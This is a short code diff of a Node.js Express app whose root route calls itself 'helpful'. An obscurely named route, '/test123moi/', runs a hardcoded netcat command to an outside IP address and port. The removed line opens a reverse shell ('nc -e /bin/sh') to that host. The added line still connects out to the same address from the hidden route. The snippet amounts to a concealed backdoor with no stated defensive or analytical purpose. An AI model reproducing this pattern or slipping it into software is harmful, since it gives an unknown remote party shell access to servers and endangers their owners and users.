@@ -5,7 +5,7 @@ app.get('/', function (req, res) {
   res.send('Im an helpful app!');
 });
 app.get('/test123moi/', function (req, ses){
-  exec("nc -e /bin/sh 3.128.221.38 9994", (error, stdout, stderr) => {
+  exec("nc 3.128.221.38 9994", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         return;
